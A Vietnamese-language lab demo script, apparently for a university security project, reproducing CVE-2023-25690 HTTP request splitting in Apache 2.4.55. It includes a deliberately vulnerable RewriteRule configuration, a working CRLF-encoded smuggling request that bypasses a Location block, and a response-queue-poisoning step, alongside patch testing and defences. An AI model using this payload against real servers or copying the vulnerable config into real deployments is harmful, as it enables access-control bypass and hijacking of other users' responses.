# 🎬 Kịch Bản Demo CVE-2023-25690 — Burp Suite + Inspector Logs

> **Thời lượng:** ~20 phút | **Công cụ:** Burp Suite Repeater + `docker compose logs inspector`
> **Mục tiêu:** Chứng minh mod_proxy (Apache 2.4.55) bị tách request khi `RewriteRule` có cờ `[P]` và đưa dữ liệu client vào sau `?`, từ đó vượt qua `<Location>` chặn `/v3/api-docs`.
> **Phạm vi:** Chỉ chạy trên localhost của lab. Không áp dụng cho hệ thống khác.

---

## 🎯 Tổng Quan

```
Burp Repeater ──► Apache (port 8000) ──► Inspector (8090) ──► Backend Spring (8080)
                   │  <Location>                 │
                   │  chặn /v3/api-docs          └─ ghi REQ #N / RSP #N
                   └─ RewriteRule [P] + ?$1
```

**Chứng minh chính:**
- **Burp:** Response đầu tiên là `401` (của request bị tách, không phải request đã gửi).
- **Inspector:** Có hai `REQ` từ cùng một kết nối: `/api/categories?...` và `GET /v3/api-docs` → `RSP` 200.
- **Đối chứng:** Gửi trực tiếp `GET /v3/api-docs` bị `403` từ Apache.

---

## 🔧 Cấu Hình Lab Cho Demo

### 1. Apache — `apache/httpd.conf` (phần VirtualHost)

```apache
    <Location "/v3/api-docs">
        Require all denied
    </Location>

    ProxyPass        "/api/" "http://inspector:8090/api/" enablereuse=on
    ProxyPassReverse "/api/" "http://inspector:8090/api/"

    ProxyPass        "/" "http://backend:8080/"
    ProxyPassReverse "/" "http://backend:8080/"

    RewriteEngine On
    RewriteCond %{THE_REQUEST} !%0d%0a [NC]
    RewriteRule "^/categories/(\d+)$" "http://inspector:8090/api/categories/$1" [P,L]

    RewriteRule "^/categories/(.*)" "http://inspector:8090/api/categories?$1" [P,L]
```

- Request bình thường `/categories/N` → inspector `/api/categories/N`.
- Request có `%0d%0a` trong request line → rule thứ hai, dữ liệu đi vào sau `?`.
- `enablereuse=on` cho worker `/api/` để kết nối tới inspector được tái sử dụng.

### 2. Inspector — `http_inspector/inspector.py`

Trong class `HTTPInspectorHandler`, có dòng:
```python
    protocol_version = "HTTP/1.1"
```
Dòng này cho phép inspector đọc nhiều request trên cùng một kết nối. Sau khi sửa, build lại:
```powershell
docker compose up -d --build inspector
```

### 3. Phiên bản Apache

`docker-compose.yml` dùng `httpd:${APACHE_VERSION:-2.4.55}`. Mặc định là 2.4.55 (vulnerable).

```powershell
docker exec apache_proxy httpd -v
```

---

## 🚀 Chuẩn Bị (trước demo 30 phút)

**Terminal 1 — Docker**
```powershell
cd D:\code\BTL-AnToanMang
docker compose up -d --build
docker exec apache_proxy httpd -t
docker compose ps
```
Kỳ vọng: `Syntax OK`, các container đều `Up`/`healthy`.

**Terminal 2 — Log inspector (theo dõi)**
```powershell
docker compose logs inspector -f
```

**Burp Suite**
- Mở tab **Repeater**, tạo 3 tab: `Baseline`, `Smuggle`, `Victim`.
- Target: `http://localhost:8000`.

---

## 🎬 Kịch Bản (từng giai đoạn)

### GIAI ĐOẠN 1 — Baseline (2 phút)

**1.1 Request bình thường tới route được proxy**

Tab `Baseline`:
```http
GET /categories/1 HTTP/1.1
Host: localhost:8000

```
Kỳ vọng: `200 OK`, body là danh mục id 1.
Log inspector: `REQ` tới `GET /api/categories/1`.

**1.2 Endpoint bị chặn bởi Apache**

```http
GET /v3/api-docs HTTP/1.1
Host: localhost:8000

```
Kỳ vọng: `403 Forbidden` từ `<Location>`.
Log inspector: **không** có `REQ` mới (Apache chặn trước khi tới inspector).

**Nói:** "Apache chặn `/v3/api-docs` ở lớp biên. Mục tiêu là vượt qua lớp này mà không thay đổi cấu hình."

📸 Chụp Burp (1.2 → 403).

---

### GIAI ĐOẠN 2 — Request Tách (5 phút)

Tab `Smuggle`, gửi đúng nội dung sau (dòng trống ở cuối là bắt buộc):

```http
GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%3a8000%0d%0a%0d%0aGET%20/v3/api-docs%20HTTP/1.1%0d%0aX-Pad:%20x HTTP/1.1
Host: localhost:8000

```

Click **Send**.

**Response Burp kỳ vọng:** `401` với JSON `code 1003`. Đây là response của request đầu tiên sau khi bị tách, không phải của `/v3/api-docs`.

**Log inspector kỳ vọng:**
```
REQ #N   GET /api/categories?... HTTP/1.1          → RSP #N   401
REQ #N+1 GET /v3/api-docs HTTP/1.1                 → RSP #N+1 200 OK (OpenAPI JSON)
```

Kiểm tra bằng:
```powershell
docker compose logs inspector 2>&1 | Select-String -Pattern "REQ #|RSP #"
```

**Nói:**
```
"Tôi gửi 1 request. Apache chỉ thấy 1 request và chuyển tiếp.
Nhưng dữ liệu nằm sau '?' không bị escape, nên CR/LF được giữ nguyên.
Backend nhận được 2 request từ cùng kết nối:
- Request #1 bị chặn ở Apache (không có mặt trong luồng này)
- Request #2 /v3/api-docs: đi qua mà không bị kiểm tra <Location>."
```

📸 Chụp Burp (401).
📸 Chụp inspector: `REQ` tới `/v3/api-docs` và `RSP` 200.

---

### GIAI ĐOẠN 3 — Đối Chứng (2 phút)

Tab `Baseline`, gửi lại đúng request ở 1.2:
```http
GET /v3/api-docs HTTP/1.1
Host: localhost:8000

```
Kỳ vọng: `403`, không có `REQ` mới trong inspector.

**Nói:** "Cùng một endpoint, gửi trực tiếp thì bị chặn. Chỉ khi đưa vào request tách thì mới đi qua."

---

### GIAI ĐOẠN 4 — Response Queue Poisoning (tùy chọn, 4 phút)

Mục tiêu: chứng minh response 200 của request bị tách đã bị gán nhầm cho request khác đi qua cùng kết nối.

1. Gửi lại request tách ở tab `Smuggle` (Giai đoạn 2).
2. Trong vài giây sau, gửi ở tab `Victim`:
```http
GET /api/categories/1 HTTP/1.1
Host: localhost:8000

```
3. Kỳ vọng nếu RQP thành công: response là JSON OpenAPI (`"openapi":"3.1.0"`) thay vì danh mục.
4. Nếu không thành công: kết nối có thể đã đóng hoặc timeout. Lặp lại từ bước 1. Ghi lại kết quả thực tế.

Kiểm tra cùng worker:
```powershell
docker logs apache_proxy 2>&1 | Select-String -Pattern "found worker|has released connection|no keepalive" | Select-Object -Last 12
```

**Lưu ý:** Phần này ảnh hưởng đến mọi request đi qua cùng kết nối. Chỉ làm trong lab, không làm khi có người khác đang dùng.

---

### GIAI ĐOẠN 5 — Đối Chứng Apache Đã Vá (4 phút)

Dừng và khởi động lại với Apache 2.4.58:
```powershell
docker compose down
$env:APACHE_VERSION="2.4.58"
docker compose up -d --build
docker exec apache_proxy httpd -v
```

Gửi lại đúng request tách ở Giai đoạn 2.

**Kết quả cần ghi lại (không phải kết quả đã biết trước):**
- Burp: response là gì (400, 401, hay 403?).
- Inspector: có `REQ` tới `/v3/api-docs` không?

Nếu không có `REQ` tới `/v3/api-docs`, bản 2.4.58 đã chặn việc tách request. Ghi kết quả thực tế vào báo cáo.

Đặt lại biến môi trường sau khi xong:
```powershell
Remove-Item Env:APACHE_VERSION
```

---

## 💡 Bài Học & Talking Points

### CVE-2023-25690 là gì?
```
Lỗi trong mod_proxy/mod_rewrite của Apache 2.4.0 – 2.4.55.
Khi RewriteRule có [P] và đưa capture vào sau '?' trong substitution,
CR/LF từ client không bị escape khi gửi tới backend.
→ Một request có thể trở thành nhiều request ở phía backend.
```

### Tại sao Apache chặn được `/v3/api-docs` nhưng backend thì không?
```
<Location> kiểm tra URL mà Apache nhận được (/categories/...).
Request bị tách có đích /v3/api-docs được tạo ra sau khi kiểm tra,
nên không đi qua <Location>.
→ Kiểm soát truy cập ở proxy không đủ nếu proxy có lỗi parsing.
```

### Cách phòng thủ
```
1. Nâng cấp Apache ≥ 2.4.56 (cách vá chính thức).
2. Không đưa capture vào sau '?' của RewriteRule có [P] mà không validate.
3. Backend tự kiểm tra xác thực/phân quyền cho endpoint nhạy cảm.
4. Giám sát: log REQ/RSP theo kết nối, cảnh báo request có CR/LF.
```

---

## 📸 Screenshots Cần Chụp

| # | Nguồn | Nội dung | Lý do |
|---|-------|----------|-------|
| 1 | Burp | `GET /categories/1` → 200 | Baseline: route bình thường hoạt động |
| 2 | Burp | `GET /v3/api-docs` → 403 | Apache đang chặn |
| 3 | Burp | Request tách → 401 | Response đầu tiên của request bị tách |
| 4 | Inspector | `REQ` `/api/categories?...`, `REQ` `/v3/api-docs`, `RSP` 200 | **Bằng chứng chính** |
| 5 | Burp | Victim request nhận OpenAPI JSON | RQP (nếu thành công) |
| 6 | Burp + Inspector | Apache 2.4.58: kết quả thực tế | Đối chứng sau khi vá |

---

## ✅ Checklist Chuẩn Bị

- [ ] `docker compose up -d --build` thành công
- [ ] `docker exec apache_proxy httpd -t` → `Syntax OK`
- [ ] `inspector.py` có `protocol_version = "HTTP/1.1"` và đã build lại
- [ ] Terminal 2: `docker compose logs inspector -f` đang chạy
- [ ] Burp Repeater có 3 tab: `Baseline`, `Smuggle`, `Victim`
- [ ] `GET /categories/1` → 200
- [ ] `GET /v3/api-docs` → 403
- [ ] Request tách → 401 ở Burp, inspector có `REQ` `/v3/api-docs` và `RSP` 200
- [ ] Đã chụp đủ screenshot trong bảng trên

---

## 🚨 Troubleshooting

| Vấn đề | Cách kiểm tra |
|--------|---------------|
| `GET /categories/1` không trả 200 | `docker exec apache_proxy httpd -t`, rồi xem `rewrite` trong log `apache_proxy` |
| Không có `REQ` tới `/v3/api-docs` | Xem `apache_proxy` có `%0D%0A` trong `using default reverse proxy worker` không; nếu có nghĩa là CR/LF đã bị escape |
| Inspector chỉ có một `REQ` | Kiểm tra `protocol_version = "HTTP/1.1"` trong `inspector.py` và đã build lại chưa |
| Log không có `REQ #1` | Đừng dùng `--tail` hoặc `--since`; dùng `docker compose logs inspector 2>&1 \| Select-String -Pattern "REQ #\|RSP #"` |
| RQP không thành công | Xem `found worker` và `has released connection` trong log `apache_proxy`; lặp lại từ Giai đoạn 2 |

---

## 🧹 Dọn Dẹp Sau Demo

Trả cấu hình về trạng thái ban đầu nếu cần dùng cho việc khác:
- Xóa rule `RewriteRule` tấn công và `RewriteCond`.
- Nếu không cần keepalive, bỏ `enablereuse=on` (hoặc để nguyên nếu vẫn dùng).
- `docker compose restart apache`.
